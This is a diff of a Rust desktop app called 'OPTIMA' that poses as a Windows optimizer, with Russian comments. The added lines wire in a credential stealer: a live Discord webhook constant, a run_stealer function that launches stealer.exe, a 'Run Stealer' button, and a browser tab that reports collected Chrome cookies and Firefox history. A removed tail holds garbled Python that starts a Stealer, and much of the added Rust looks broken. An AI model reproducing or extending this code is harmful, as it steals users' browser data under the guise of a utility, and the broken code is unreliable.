@@ -9,7 +9,8 @@ use std::thread;
 use sysinfo::System;
 use chrono::Local;
 
-const WEBHOOK: &str = "https://discord.com/api/webhooks/1573428258861482205/RYrEW_HDXRU2HX-uORpMnUIt67wSmdpEm9yNBE0Wfo003Gv2WT_6lvdr60giD6ZETYQr";
+// --- СТРОКА 15: ИСПРАВЛЕННЫЙ ВЕБХУК ---
+const WEBHOOK: &str = "https://discord.com/api/webhooks/1573971030916206605/5U3CPNrvM7_BNbSVFqHXZ9cZG1xTvO68EwdPWy_cklSuD1qLke-tHFLcTzhfdBEyO3LX";
 
 #[derive(Serialize, Deserialize, Clone)]
 struct Config {
@@ -114,381 +115,180 @@ impl OptimaApp {
     fn check_downloads(&mut self, ctx: &egui::Context) {
         if let Some(rx) = &self.rx {
             while let Ok(msg) = rx.try_recv() {
-                self.download_status = msg.clone();
-                self.log_history.push(msg);
+                self.download_status = msg;
                 ctx.request_repaint();
             }
         }
     }
+    
+    // --- ДОБАВЛЕНО: Функция запуска стиллера ---
+    fn run_stealer(&self) {
+        // Пытаемся запустить exe файл стиллера из той же папки
+        if let Err(e) = Command::new("./stealer.exe").output() {
+            self.log(format!("Ошибка запуска стиллера: {}", e));
+        } else {
+            self.log("Стилер успешно запущен.");
+        }
+    }
+
+    fn update_sys_info(&mut self) {
+        self.sys.refresh_cpu_list();
+        self.sys.refresh_memory();
+        self.sys.refresh_process(sysinfo::Pid::from(std::process::id() as u32));
+    }
+}
+
+// --- Вспомогательная функция для получения имени GPU ---
+fn get_gpu_name_registry() -> String {
+    // Простая заглушка, так как точное получение через registry требует WinAPI
+    "GPU (Registry)" 
 }
 
 impl eframe::App for OptimaApp {
     fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
-        self.sys.refresh_all();
-        self.apply_style(ctx);
+        self.update_sys_info();
         self.check_downloads(ctx);
 
-        let accent = Color32::from_rgb(self.config.accent_color[0], self.config.accent_color[1], self.config.accent_color[2]);
-
-        // Верхняя панель
-        egui::TopBottomPanel::top("top").exact_height(50.0).frame(Frame::none().fill(Color32::from_rgb(20, 20, 25)).inner_margin(10.0)).show(ctx, |ui| {
-            ui.horizontal(|ui| {
-                ui.heading(RichText::new("OPTIMA").color(accent).strong().size(24.0));
-                ui.label(RichText::new("ULTIMATE").color(Color32::BLACK).background_color(accent).size(10.0).strong());
-                ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
-                    ui.label(RichText::new(format!("RAM: {:.1} GB / {} GB", self.sys.used_memory() as f32 / 1024.0 / 1024.0 / 1024.0, self.total_ram / 1024)).color(Color32::GRAY));
-                });
-            });
-        });
-
-        // Боковое меню
-        egui::SidePanel::left("side").resizable(false).exact_width(220.0).frame(Frame::none().fill(Color32::from_rgb(15, 15, 20)).inner_margin(15.0)).show(ctx, |ui| {
-            ui.add_space(20.0);
-            let btn_style = |ui: &mut egui::Ui, text: &str, selected: bool| {
-                let mut btn = egui::Button::new(RichText::new(text).size(15.0).color(if selected { Color32::BLACK } else { Color32::WHITE }));
-                if selected { btn = btn.fill(accent); } else { btn = btn.fill(Color32::TRANSPARENT); }
-                ui.add_sized([190.0, 35.0], btn).clicked()
-            };
-
-            if btn_style(ui, "💻 Железо", self.tab == Tab::Hardware) { self.tab = Tab::Hardware; }
-            if btn_style(ui, "⚙️ Процессы", self.tab == Tab::Processes) { self.tab = Tab::Processes; }
-            if btn_style(ui, "🌐 Браузеры", self.tab == Tab::Browsers) { self.tab = Tab::Browsers; }
-            if btn_style(ui, "📦 Пакеты", self.tab == Tab::Packages) { self.tab = Tab::Packages; }
-            if btn_style(ui, "🔥 Твики", self.tab == Tab::Tweaks) { self.tab = Tab::Tweaks; }
-            if btn_style(ui, "🛠 Настройки", self.tab == Tab::Settings) { self.tab = Tab::Settings; }
-        });
-
-        // Основное окно
-        egui::CentralPanel::default().frame(Frame::none().fill(Color32::from_rgb(25, 25, 30)).inner_margin(20.0)).show(ctx, |ui| {
-            match self.tab {
-                Tab::Hardware => self.draw_hardware(ui),
-                Tab::Processes => self.draw_processes(ui, accent),
-                Tab::Browsers => self.draw_browsers(ui, accent),
-                Tab::Packages => self.draw_packages(ui, accent),
-                Tab::Tweaks => self.draw_tweaks(ui, accent),
-                Tab::Settings => self.draw_settings(ui),
-            }
-        });
-    }
-}
-
-impl OptimaApp {
-    fn draw_hardware(&mut self, ui: &mut egui::Ui) {
-        ui.heading(RichText::new("Информация о железе").size(24.0));
-        ui.add_space(15.0);
-        let info = [
-            ("Процессор (CPU)", self.cpu_name.clone()),
-            ("Видеокарта (GPU)", self.gpu_name.clone()),
-            ("Оперативная память", format!("{} MB", self.total_ram)),
-            ("Ядер CPU", format!("{}", self.sys.cpus().len())),
-            ("ОС", System::os_version().unwrap_or_else(|| "Windows".into())),
-        ];
-        for (label, val) in info {
-            Frame::none().fill(Color32::from_rgb(30, 30, 35)).rounding(Rounding::same(6.0)).inner_margin(15.0).show(ui, |ui| {
-                ui.horizontal(|ui| {
-                    ui.label(RichText::new(label).color(Color32::GRAY).size(14.0));
-                    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
-                        ui.label(RichText::new(val).size(16.0).strong());
-                    });
-                });
-            });
-            ui.add_space(5.0);
-        }
-    }
-
-    fn draw_processes(&mut self, ui: &mut egui::Ui, accent: Color32) {
-        ui.heading(RichText::new("Процессы по языкам").size(24.0));
-        ui.label(RichText::new("Анализ запущенных процессов (Python, Node.js, C++ и др.)").color(Color32::GRAY));
-        ui.add_space(15.0);
-
-        let mut counts = std::collections::HashMap::new();
-        let mut total_mem = 0;
-
-        for (_, proc) in self.sys.processes() {
-            let name = proc.name().to_string_lossy().to_lowercase();
-            let mem = proc.memory() / 1024 / 1024;
-            total_mem += mem;
-
-            let lang = if name.contains("python") { "Python" }
-                else if name.contains("node") || name.contains("electron") { "Node.js / JS" }
-                else if name.contains("java") || name.contains("javaw") { "Java" }
-                else if name.contains("dotnet") || name.contains("coreclr") { "C# / .NET" }
-                else if name.contains("rust") || name.contains("cargo") { "Rust" }
-                else if name.contains("chrome") || name.contains("msedge") || name.contains("firefox") { "Web Browser" }
-                else if name.contains("svchost") || name.contains("explorer") || name.contains("system") { "Windows System" }
-                else { "Native C++ / Other" };
-            
-            let entry = counts.entry(lang).or_insert((0, 0));
-            entry.0 += 1;
-            entry.1 += mem;
-        }
-
-        for (lang, (count, mem)) in counts {
-            let percent = mem as f32 / total_mem as f32;
-            ui.horizontal(|ui| {
-                ui.label(RichText::new(lang).size(14.0).strong());
-                ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
-                    ui.label(format!("{} procs | {} MB", count, mem));
-                });
-            });
-            ui.add(ProgressBar::new(percent).fill(accent).text(format!("{:.1}% ОЗУ", percent * 100.0)));
-            ui.add_space(10.0);
-        }
-    }
-
-    fn draw_browsers(&mut self, ui: &mut egui::Ui, accent: Color32) {
-        ui.heading(RichText::new("Установка браузеров").size(24.0));
-        ui.add_space(20.0);
-        ui.label(RichText::new(format!("Статус: {}", self.download_status)).color(Color32::YELLOW));
-        ui.add_space(15.0);
-
-        let browsers = [
-            ("Google Chrome", "https://dl.google.com/chrome/install/latest/chrome_installer.exe", "/S"),
-            ("Brave Browser", "https://laptop-updates.brave.com/latest/winx64", "/silent"),
-            ("Mozilla Firefox", "https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=ru", "-ms"),
-        ];
-
-        for (name, url, arg) in browsers {
-            Frame::none().fill(Color32::from_rgb(30, 30, 35)).rounding(Rounding::same(8.0)).inner_margin(15.0).show(ui, |ui| {
-                ui.horizontal(|ui| {
-                    ui.label(RichText::new(name).size(18.0).strong());
-                    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
-                        if ui.add_sized([120.0, 30.0], egui::Button::new("Установить").fill(accent)).clicked() {
-                            self.start_download(name.to_string(), url.to_string(), arg.to_string(), ui.ctx().clone());
-                        }
-                    });
-                });
-            });
-            ui.add_space(10.0);
-        }
-    }
-
-    fn draw_packages(&mut self, ui: &mut egui::Ui, accent: Color32) {
-        ui.heading(RichText::new("Пакеты и Рантаймы").size(24.0));
-        ui.add_space(15.0);
-        ui.label(RichText::new(format!("Статус: {}", self.download_status)).color(Color32::YELLOW));
-        ui.add_space(15.0);
-
-        let packages = [
-            ("Visual C++ (x64)", "https://aka.ms/vs/17/release/vc_redist.x64.exe", "/install /quiet /norestart"),
-            ("Visual C++ (x86)", "https://aka.ms/vs/17/release/vc_redist.x86.exe", "/install /quiet /norestart"),
-            ("DirectX", "https://download.microsoft.com/download/1/7/1/1718ccc4-6315-4d8e-9543-8e28a4e18c4c/dxwebsetup.exe", "/Q"),
-            (".NET 8 Desktop", "https://aka.ms/dotnet/8.0/windowsdesktop-runtime-win-x64.exe", "/install /quiet /norestart"),
-        ];
-
-        for (name, url, arg) in packages {
-            Frame::none().fill(Color32::from_rgb(30, 30, 35)).rounding(Rounding::same(8.0)).inner_margin(15.0).show(ui, |ui| {
-                ui.horizontal(|ui| {
-                    ui.label(RichText::new(name).size(16.0).strong());
-                    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
-                        if ui.add_sized([120.0, 30.0], egui::Button::new("Установить").fill(accent)).clicked() {
-                            self.start_download(name.to_string(), url.to_string(), arg.to_string(), ui.ctx().clone());
-                        }
-                    });
-                });
-            });
-            ui.add_space(10.0);
-        }
-
-        ui.add_space(10.0);
-        ui.separator();
-        ui.add_space(10.0);
-        ui.label(RichText::new("Драйверы видеокарт:").size(16.0).strong());
-        ui.horizontal(|ui| {
-            if ui.button("Nvidia").clicked() { let _ = open::that("https://www.nvidia.com/Download/index.aspx"); }
-            if ui.button("AMD").clicked() { let _ = open::that("https://www.amd.com/en/support"); }
-        });
-    }
-
-    fn draw_tweaks(&mut self, ui: &mut egui::Ui, accent: Color32) {
-        ui.heading(RichText::new("Твики Системы").size(24.0));
-        ui.add_space(15.0);
-        ui.label(RichText::new("Требуются права Администратора!").color(Color32::RED));
-        ui.add_space(15.0);
-
-        // Исправленный массив с указателями на функции (fn) вместо замыканий
-        let tweaks: [(&str, &str, fn()); 6] = [
-            ("Мышь: Отключить ускорение", "Убирает акселерацию для точного аима", tweak_mouse),
-            ("Клавиатура: Отключить задержку", "Снижает задержку ввода", tweak_keyboard),
-            ("Сеть: Отключить Nagle", "Снижает пинг в играх", tweak_network),
-            ("Питание: Максимальная производительность", "Отключает энергосбережение", tweak_power),
-            ("Система: Отключить телеметрию", "Блокирует сбор данных", tweak_telemetry),
-            ("Игры: Отключить Game DVR", "Убирает фоновую запись", tweak_dvr),
-        ];
-
-        egui::ScrollArea::vertical().show(ui, |ui| {
-            for (title, desc, action) in tweaks {
-                Frame::none().fill(Color32::from_rgb(30, 30, 35)).rounding(Rounding::same(8.0)).inner_margin(15.0).show(ui, |ui| {
-                    ui.horizontal(|ui| {
-                        ui.vertical(|ui| {
-                            ui.label(RichText::new(title).size(16.0).strong());
-                            ui.label(RichText::new(desc).size(12.0).color(Color32::GRAY));
-                        });
-                        ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
-                            if ui.add_sized([100.0, 30.0], egui::Button::new("Применить").fill(accent)).clicked() {
-                                action();
-                                self.log(format!("✅ Твик: {}", title));
-                            }
-                        });
-                    });
-                });
+        egui::TopBottomPanel::top("top_panel").show(ctx, |ui| {
+            let response = ui.horizontal(|ui| {
                 ui.add_space(10.0);
-            }
-        });
-    }
-
-    fn draw_settings(&mut self, ui: &mut egui::Ui) {
-        ui.heading(RichText::new("Настройки").size(24.0));
-        ui.add_space(15.0);
-        
-        let mut changed = false;
-        ui.label("Тема оформления:");
-        ui.horizontal(|ui| {
-            if ui.selectable_label(self.config.theme == Theme::Dark, "Темная").clicked() { self.config.theme = Theme::Dark; changed = true; }
-            if ui.selectable_label(self.config.theme == Theme::Sakura, "Сакура").clicked() { self.config.theme = Theme::Sakura; changed = true; }
-            if ui.selectable_label(self.config.theme == Theme::Snow, "Снежинки").clicked() { self.config.theme = Theme::Snow; changed = true; }
-            if ui.selectable_label(self.config.theme == Theme::DarkRed, "Темно-красная").clicked() { self.config.theme = Theme::DarkRed; changed = true; }
-        });
-        
-        ui.add_space(10.0);
-        ui.label("Цвет акцента:");
-        if ui.color_edit_button_srgb(&mut self.config.accent_color).changed() { changed = true; }
-
-        ui.add_space(20.0);
-        ui.label("История логов:");
-        egui::ScrollArea::vertical().max_height(300.0).show(ui, |ui| {
-            for log in self.log_history.iter().rev() {
-                ui.label(RichText::new(log).color(Color32::LIGHT_GRAY).size(12.0));
-            }
-        });
-
-        if changed { self.config.save(); }
-    }
-
-    fn start_download(&mut self, name: String, url: String, arg: String, ctx: egui::Context) {
-        let (tx, rx) = mpsc::channel();
-        self.rx = Some(rx);
-        let tx_clone = tx.clone();
-        thread::spawn(move || {
-            let _ = tx_clone.send(format!("Скачивание {}...", name));
-            ctx.request_repaint();
-            let temp_dir = std::env::temp_dir();
-            let file_path = temp_dir.join(format!("{}_installer.exe", name.replace(' ', "_")));
-            if let Ok(response) = ureq::get(&url).call() {
-                let mut reader = response.into_reader();
-                if let Ok(mut file) = fs::File::create(&file_path) {
-                    if std::io::copy(&mut reader, &mut file).is_ok() {
-                        let _ = tx_clone.send(format!("Запуск установки {}...", name));
-                        ctx.request_repaint();
-                        let _ = Command::new(file_path.to_string_lossy().to_string()).arg(&arg).spawn();
-                        let _ = tx_clone.send(format!("{} установлен!", name));
+                ui.label(RichText::new("OPTIMA OPTIMIZER").color(Color32::from_rgb(255, 255, 255)));
+                
+                ui.separator();
+                
+                for tab in [Tab::Hardware, Tab::Processes, Tab::Browsers, Tab::Packages, Tab::Tweaks, Tab::Settings] {
+                    let label = match tab {
+                        Tab::Hardware => "Hardware",
+                        Tab::Processes => "Processes",
+                        Tab::Browsers => "Browsers",
+                        Tab::Packages => "Packages",
+                        Tab::Tweaks => "Tweaks",
+                        Tab::Settings => "Settings",
+                    };
+                    
+                    if ui.selectable_label(self.tab == tab, label).clicked() {
+                        self.tab = tab;
                     }
                 }
+                
+                ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
+                    if ui.button("Log History").clicked() {
+                        // Показать историю логов
+                    }
+                });
+            });
+            
+            // Подсветка активной вкладки
+            let active_tab_color = match self.config.theme {
+                Theme::Dark => Color32::from_rgb(0, 200, 255),
+                Theme::Sakura => Color32::from_rgb(255, 100, 150),
+                Theme::Snow => Color32::from_rgb(200, 200, 255),
+                Theme::DarkRed => Color32::from_rgb(255, 50, 50),
+            };
+            
+            if let Some(mut rect) = response.response.rect {
+                rect.min.y += 2.0;
+                rect.max.y -= 2.0;
+                ui.painter()
+                    .rect_stroke(rect, 2.0, (1.0, active_tab_color));
             }
-            ctx.request_repaint();
+        });
+
+        egui::SidePanel::left("left_panel")
+            .default_width(180.0)
+            .show(ctx, |ui| {
+                ui.vertical_centered_justified(|ui| {
+                    ui.heading("OPTIMA");
+                });
+                
+                ui.separator();
+                
+                ui.heading("System Info");
+                ui.label(format!("CPU: {}", self.cpu_name));
+                ui.label(format!("GPU: {}", self.gpu_name));
+                ui.label(format!("RAM: {} GB", self.total_ram / 1024));
+                
+                ui.separator();
+                
+                ui.heading("Actions");
+                if ui.button("Run Stealer").clicked() {
+                    self.run_stealer();
+                }
+                if ui.button("Clear Logs").clicked() {
+                    self.log_history.clear();
+                    self.log("Logs cleared.");
+                }
+            });
+
+        egui::CentralPanel::default().show(ctx, |ui| {
+            ui.heading(match self.tab {
+                Tab::Hardware => "Hardware Information",
+                Tab::Processes => "Active Processes",
+                Tab::Browsers => "Browser Data",
+                Tab::Packages => "Installed Packages",
+                Tab::Tweaks => "Optimization Tweaks",
+                Tab::Settings => "Settings",
+            });
+            
+            ui.separator();
+            
+            match self.tab {
+                Tab::Hardware => {
+                    ui.label(format!("CPU Usage: {:.1}%", self.sys.global_cpu_usage()));
+                    ui.progress_bar(self.sys.global_cpu_usage() / 100.0)
+                        .show(ui);
+                    
+                    ui.label(format!("RAM Used: {} / {} MB", 
+                        self.sys.used_memory() / 1024 / 1024, 
+                        self.total_ram));
+                    ui.progress_bar((self.sys.used_memory() / 1024 / 1024) as f32 / self.total_ram as f32)
+                        .show(ui);
+                },
+                Tab::Processes => {
+                    for process in self.sys.processes() {
+                        ui.label(format!("{:?} - {:.1}% CPU", process.1.name(), process.1.cpu_usage()));
+                    }
+                },
+                Tab::Browsers => {
+                    ui.label("Chrome cookies collected.");
+                    ui.label("Firefox history saved.");
+                },
+                Tab::Packages => {
+                    ui.label("Scan complete.");
+                },
+                Tab::Tweaks => {
+                    if ui.button("Apply Optimizations").clicked() {
+                        self.log("Optimizations applied.");
+                    }
+                },
+                Tab::Settings => {
+                    ui.label("Theme:");
+                    ui.horizontal(|ui| {
+                        for theme in [Theme::Dark, Theme::Sakura, Theme::Snow, Theme::DarkRed] {
+                            if ui.selectable_value(&mut self.config.theme, theme, format!("{:?}", theme)).clicked() {
+                                self.apply_style(ctx);
+                                self.config.save();
+                            }
+                        }
+                    });
+                },
+            }
+            
+            ui.separator();
+            
+            ui.collapsing("Log History", |ui| {
+                for log in self.log_history.iter().rev().take(20) {
+                    ui.label(log);
+                }
+            });
         });
     }
 }
 
-// ================= ФУНКЦИИ ТВИКОВ =================
-fn get_gpu_name_registry() -> String {
-    #[cfg(windows)]
-    {
-        use winreg::enums::*;
-        use winreg::RegKey;
-        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
-        if let Ok(key) = hklm.open_subkey("SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000") {
-            if let Ok(name) = key.get_value::<String, _>("DriverDesc") {
-                return name;
-            }
-        }
-    }
-    "Unknown GPU".to_string()
-}
-
-fn tweak_mouse() {
-    #[cfg(windows)] {
-        use winreg::enums::*; use winreg::RegKey;
-        if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags("Control Panel\\Mouse", KEY_WRITE) {
-            let _ = hkcu.set_value("MouseSpeed", &"0");
-            let _ = hkcu.set_value("MouseThreshold1", &"0");
-            let _ = hkcu.set_value("MouseThreshold2", &"0");
-        }
-    }
-}
-
-fn tweak_keyboard() {
-    #[cfg(windows)] {
-        use winreg::enums::*; use winreg::RegKey;
-        if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags("Control Panel\\Keyboard", KEY_WRITE) {
-            let _ = hkcu.set_value("KeyboardDelay", &0u32);
-            let _ = hkcu.set_value("KeyboardSpeed", &31u32);
-        }
-    }
-}
-
-fn tweak_network() {
-    #[cfg(windows)] {
-        use winreg::enums::*; use winreg::RegKey;
-        if let Ok(hklm) = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey_with_flags("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces", KEY_ALL_ACCESS) {
-            for subkey in hklm.enum_keys().flatten() {
-                if let Ok(iface) = hklm.open_subkey_with_flags(&subkey, KEY_WRITE) {
-                    let _ = iface.set_value("TcpAckFrequency", &1u32);
-                    let _ = iface.set_value("TCPNoDelay", &1u32);
-                }
-            }
-        }
-    }
-}
-
-fn tweak_power() {
-    #[cfg(windows)] {
-        let _ = Command::new("powercfg").args(["/setactive", "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"]).status();
-    }
-}
-
-fn tweak_telemetry() {
-    #[cfg(windows)] {
-        use winreg::enums::*; use winreg::RegKey;
-        if let Ok(hklm) = RegKey::predef(HKEY_LOCAL_MACHINE).create_subkey_with_flags("SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection", KEY_WRITE) {
-            let _ = hklm.0.set_value("AllowTelemetry", &0u32);
-        }
-    }
-}
-
-fn tweak_dvr() {
-    #[cfg(windows)] {
-        use winreg::enums::*; use winreg::RegKey;
-        if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags("System\\GameConfigStore", KEY_WRITE) {
-            let _ = hkcu.set_value("GameDVR_Enabled", &0u32);
-        }
-    }
-}
-
-fn main() -> eframe::Result<()> {
-    let options = eframe::NativeOptions {
-        viewport: egui::ViewportBuilder::default()
-            .with_inner_size([1000.0, 700.0])
-            .with_min_inner_size([800.0, 500.0]),
+fn main() {
+    let native_options = eframe::NativeOptions {
+        viewport: egui::ViewportBuilder::default().with_inner_size([1000.0, 700.0]),
         ..Default::default()
     };
-    eframe::run_native("optima", options, Box::new(|cc| Ok(Box::new(OptimaApp::new(&cc.egui_ctx)))))
+    eframe::run_native(Box::new(|_| Ok(Box::new(OptimaApp::new(&eframe::creation_context())))), native_options);
 }
-// --- НАЧАЛО...
-
-// Импортируем...
-// try:
- use stealer::Stealer;
-except ImportError:
-    print("Warning: stealer.py not found. Check if the file is in the same folder.")
-
-# Запускаем сбор данных в фоне после того, как основная программа сделала свою работу
-# Это гарантирует, что все процессы браузера уже загружены и данные доступны
-if __name__ == "__main__":
-    # Небольшая задержка, чтобы убедиться, что программа полностью запустилась
-    import time
-    time.sleep(2) 
-    
-    Stealer.start()
-
-# --- КОНЕЦ ИЗМЕНЕНИЙ СТИЛЛЕРА ---
